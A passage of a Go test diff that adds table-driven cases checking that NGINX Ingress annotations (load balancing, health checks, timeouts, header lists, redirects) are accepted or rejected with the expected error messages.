+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/lb-method: Invalid value: "least_time header;": invalid load balancing method: "least_time header;"`,
+			},
+			msg: "invalid nginx.org/lb-method annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/lb-method": "{least_time header}",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/lb-method: Invalid value: "{least_time header}": invalid load balancing method: "{least_time header}"`,
+			},
+			msg: "invalid nginx.org/lb-method annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/lb-method": "$least_time header",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/lb-method: Invalid value: "$least_time header": invalid load balancing method: "$least_time header"`,
+			},
+			msg: "invalid nginx.org/lb-method annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/lb-method": "invalid_method",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/lb-method: Invalid value: "invalid_method": invalid load balancing method: "invalid_method"`,
+			},
+			msg: "invalid nginx.org/lb-method annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.com/health-checks": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.nginx.com/health-checks: Forbidden: annotation requires NGINX Plus",
+			},
+			msg: "invalid nginx.com/health-checks annotation, nginx plus only",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/health-checks": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.com/health-checks annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/health-checks": "not_a_boolean",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.com/health-checks: Invalid value: "not_a_boolean": must be a boolean`,
+			},
+			msg: "invalid nginx.com/health-checks annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.com/health-checks-mandatory": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.nginx.com/health-checks-mandatory: Forbidden: annotation requires NGINX Plus",
+			},
+			msg: "invalid nginx.com/health-checks-mandatory annotation, nginx plus only",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/health-checks":           "true",
+				"nginx.com/health-checks-mandatory": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.com/health-checks-mandatory annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/health-checks":           "true",
+				"nginx.com/health-checks-mandatory": "not_a_boolean",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.com/health-checks-mandatory: Invalid value: "not_a_boolean": must be a boolean`,
+			},
+			msg: "invalid nginx.com/health-checks-mandatory, must be a boolean",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/health-checks-mandatory": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.nginx.com/health-checks-mandatory: Forbidden: related annotation nginx.com/health-checks: must be set",
+			},
+			msg: "invalid nginx.com/health-checks-mandatory, related annotation nginx.com/health-checks not set",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/health-checks":           "false",
+				"nginx.com/health-checks-mandatory": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.nginx.com/health-checks-mandatory: Forbidden: related annotation nginx.com/health-checks: must be true",
+			},
+			msg: "invalid nginx.com/health-checks-mandatory nginx.com/health-checks is not true",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.com/health-checks-mandatory-queue": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.nginx.com/health-checks-mandatory-queue: Forbidden: annotation requires NGINX Plus",
+			},
+			msg: "invalid nginx.com/health-checks-mandatory-queue annotation, nginx plus only",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/health-checks":                 "true",
+				"nginx.com/health-checks-mandatory":       "true",
+				"nginx.com/health-checks-mandatory-queue": "5",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.com/health-checks-mandatory-queue annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/health-checks":                 "true",
+				"nginx.com/health-checks-mandatory":       "true",
+				"nginx.com/health-checks-mandatory-queue": "not_a_number",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.com/health-checks-mandatory-queue: Invalid value: "not_a_number": must be a non-negative integer`,
+			},
+			msg: "invalid nginx.com/health-checks-mandatory-queue, must be a number",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/health-checks-mandatory-queue": "5",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.nginx.com/health-checks-mandatory-queue: Forbidden: related annotation nginx.com/health-checks-mandatory: must be set",
+			},
+			msg: "invalid nginx.com/health-checks-mandatory-queue, related annotation nginx.com/health-checks-mandatory not set",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/health-checks":                 "true",
+				"nginx.com/health-checks-mandatory":       "false",
+				"nginx.com/health-checks-mandatory-queue": "5",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.nginx.com/health-checks-mandatory-queue: Forbidden: related annotation nginx.com/health-checks-mandatory: must be true",
+			},
+			msg: "invalid nginx.com/health-checks-mandatory-queue nginx.com/health-checks-mandatory is not true",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.com/slow-start": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.nginx.com/slow-start: Forbidden: annotation requires NGINX Plus",
+			},
+			msg: "invalid nginx.com/slow-start annotation, nginx plus only",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/slow-start": "60s",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.com/slow-start annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/slow-start": "not_a_time",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.com/slow-start: Invalid value: "not_a_time": must be a time`,
+			},
+			msg: "invalid nginx.com/slow-start annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/server-tokens": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/server-tokens annotation, nginx",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/server-tokens": "custom_setting",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/server-tokens annotation, nginx plus",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/server-tokens": "custom_setting",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/server-tokens: Invalid value: "custom_setting": must be a boolean`,
+			},
+			msg: "invalid nginx.org/server-tokens annotation, must be a boolean",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/server-tokens": "$custom_setting",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/server-tokens: Invalid value: "$custom_setting": ` + annotationValueFmtErrMsg,
+			},
+			msg: "invalid nginx.org/server-tokens annotation, " + annotationValueFmtErrMsg,
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/server-tokens": "custom_\"setting",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/server-tokens: Invalid value: "custom_\"setting": ` + annotationValueFmtErrMsg,
+			},
+			msg: "invalid nginx.org/server-tokens annotation, " + annotationValueFmtErrMsg,
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/server-tokens": `custom_setting\`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/server-tokens: Invalid value: "custom_setting\\": ` + annotationValueFmtErrMsg,
+			},
+			msg: "invalid nginx.org/server-tokens annotation, " + annotationValueFmtErrMsg,
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/server-snippets": "snippet-1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			snippetsEnabled:     true,
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/server-snippets annotation, single-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/server-snippets": "snippet-1\nsnippet-2\nsnippet-3",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			snippetsEnabled:     true,
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/server-snippets annotation, multi-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/server-snippets": "snippet-1",
+			},
+			specServices:      map[string]bool{},
+			isPlus:            false,
+			appProtectEnabled: false,
+
+			snippetsEnabled:     false,
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/server-snippets: Forbidden: snippet specified but snippets feature is not enabled`,
+			},
+			msg: "invalid nginx.org/server-snippets annotation when snippets are disabled",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/location-snippets": "snippet-1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			snippetsEnabled:     true,
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/location-snippets annotation, single-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/location-snippets": "snippet-1\nsnippet-2\nsnippet-3",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			snippetsEnabled:     true,
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/location-snippets annotation, multi-value",
+		},
+		{
+			annotations: map[string]string{
+				configs.AddHeaderInheritAnnotation: "on",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			snippetsEnabled:     true,
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/add-header-inherit annotation with on",
+		},
+		{
+			annotations: map[string]string{
+				configs.AddHeaderInheritAnnotation: "off",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			snippetsEnabled:     true,
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/add-header-inherit annotation with off",
+		},
+		{
+			annotations: map[string]string{
+				configs.AddHeaderInheritAnnotation: "merge",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			snippetsEnabled:     true,
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/add-header-inherit annotation with merge",
+		},
+		{
+			annotations: map[string]string{
+				configs.AddHeaderInheritAnnotation: "bogus",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			snippetsEnabled:     true,
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/add-header-inherit: Invalid value: "bogus": must be one of: 'on', 'off' or 'merge'`,
+			},
+			msg: "invalid nginx.org/add-header-inherit annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/location-snippets": "snippet-1",
+			},
+			specServices:      map[string]bool{},
+			isPlus:            false,
+			appProtectEnabled: false,
+
+			snippetsEnabled:     false,
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/location-snippets: Forbidden: snippet specified but snippets feature is not enabled`,
+			},
+			msg: "invalid nginx.org/location-snippets annotation when snippets are disabled",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-connect-timeout": "10s",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-connect-timeout annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-connect-timeout": "not_a_time",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-connect-timeout: Invalid value: "not_a_time": must be a time`,
+			},
+			msg: "invalid nginx.org/proxy-connect-timeout annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-read-timeout": "10s",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-read-timeout annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-read-timeout": "not_a_time",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-read-timeout: Invalid value: "not_a_time": must be a time`,
+			},
+			msg: "invalid nginx.org/proxy-read-timeout annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-send-timeout": "10s",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-send-timeout annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-send-timeout": "not_a_time",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-send-timeout: Invalid value: "not_a_time": must be a time`,
+			},
+			msg: "invalid nginx.org/proxy-send-timeout annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-hide-headers": "header-1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-hide-headers annotation, single-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-hide-headers": "header-1,header-2,header-3",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-hide-headers annotation, multi-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-hide-headers": "header-1, header-2, header-3",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-hide-headers annotation, multi-value with spaces",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-hide-headers": "$header1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-hide-headers: Invalid value: "$header1": ` + headerNameErrMsg,
+			},
+			msg: "invalid nginx.org/proxy-hide-headers annotation, single-value containing '$'",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-hide-headers": "{header1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-hide-headers: Invalid value: "{header1": ` + headerNameErrMsg,
+			},
+			msg: "invalid nginx.org/proxy-hide-headers annotation, single-value containing '{'",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-hide-headers": "$header1,header2",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-hide-headers: Invalid value: "$header1": ` + headerNameErrMsg,
+			},
+			msg: "invalid nginx.org/proxy-hide-headers annotation, multi-value containing '$'",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-hide-headers": "header1,$header2",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-hide-headers: Invalid value: "$header2": ` + headerNameErrMsg,
+			},
+			msg: "invalid nginx.org/proxy-hide-headers annotation, multi-value containing '$' after valid header",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-pass-headers": "header-1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-pass-headers annotation, single-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-pass-headers": "header-1,header-2,header-3",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-pass-headers annotation, multi-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-pass-headers": "header-1, header-2, header-3",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-pass-headers annotation, multi-value with spaces",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-pass-headers": "$header1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-pass-headers: Invalid value: "$header1": ` + headerNameErrMsg,
+			},
+			msg: "invalid nginx.org/proxy-pass-headers annotation, single-value containing '$'",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-pass-headers": "{header1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-pass-headers: Invalid value: "{header1": ` + headerNameErrMsg,
+			},
+			msg: "invalid nginx.org/proxy-pass-headers annotation, single-value containing '{'",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-pass-headers": "$header1,header2",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-pass-headers: Invalid value: "$header1": ` + headerNameErrMsg,
+			},
+			msg: "invalid nginx.org/proxy-pass-headers annotation, multi-value containing '$'",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-pass-headers": "header1,$header2",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-pass-headers: Invalid value: "$header2": ` + headerNameErrMsg,
+			},
+			msg: "invalid nginx.org/proxy-pass-headers annotation, multi-value containing '$' after valid header",
+		},
+
+		{
+			annotations: map[string]string{
+				configs.ProxySetHeadersAnnotation: "header-1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-set-headers annotation, single-value",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxySetHeadersAnnotation: "header-1,header-2,header-3",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-set-headers annotation, multi-value",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxySetHeadersAnnotation: "header-1, header-2, header-3",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-set-headers annotation, multi-value with spaces",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxySetHeadersAnnotation: "$header1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "$header1": ` + headerNameErrMsg,
+			},
+			msg: "invalid nginx.org/proxy-set-headers annotation, single-value containing '$'",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxySetHeadersAnnotation: "{header1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "{header1": ` + headerNameErrMsg,
+			},
+			msg: "invalid nginx.org/proxy-set-headers annotation, single-value containing '{'",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxySetHeadersAnnotation: "$header1,header2",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "$header1": ` + headerNameErrMsg,
+			},
+			msg: "invalid nginx.org/proxy-set-headers annotation, multi-value containing '$'",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxySetHeadersAnnotation: "header1,$header2",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "$header2": ` + headerNameErrMsg,
+			},
+			msg: "invalid nginx.org/proxy-set-headers annotation, multi-value containing '$' after valid header",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/client-max-body-size": "16M",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/client-max-body-size annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/client-max-body-size": "not_an_offset",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/client-max-body-size: Invalid value: "not_an_offset": must be an offset`,
+			},
+			msg: "invalid nginx.org/client-max-body-size annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/redirect-to-https": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/redirect-to-https annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/redirect-to-https": "not_a_boolean",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/redirect-to-https: Invalid value: "not_a_boolean": must be a boolean`,
+			},
+			msg: "invalid nginx.org/redirect-to-https annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/ssl-redirect": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/ssl-redirect annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/ssl-redirect": "not_a_boolean",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/ssl-redirect: Invalid value: "not_a_boolean": must be a boolean`,
+			},
+			msg: "invalid nginx.org/ssl-redirect annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"ingress.kubernetes.io/ssl-redirect": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid ingress.kubernetes.io/ssl-redirect annotation",
+		},
+		{
+			annotations: map[string]string{
+				"ingress.kubernetes.io/ssl-redirect": "not_a_boolean",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.ingress.kubernetes.io/ssl-redirect: Invalid value: "not_a_boolean": must be a boolean`,
+			},
+			msg: "invalid ingress.kubernetes.io/ssl-redirect annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "301",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/http-redirect-code annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "302",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/http-redirect-code annotation with 302",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "307",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/http-redirect-code annotation with 307",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "308",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/http-redirect-code annotation with 308",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "",
+			},
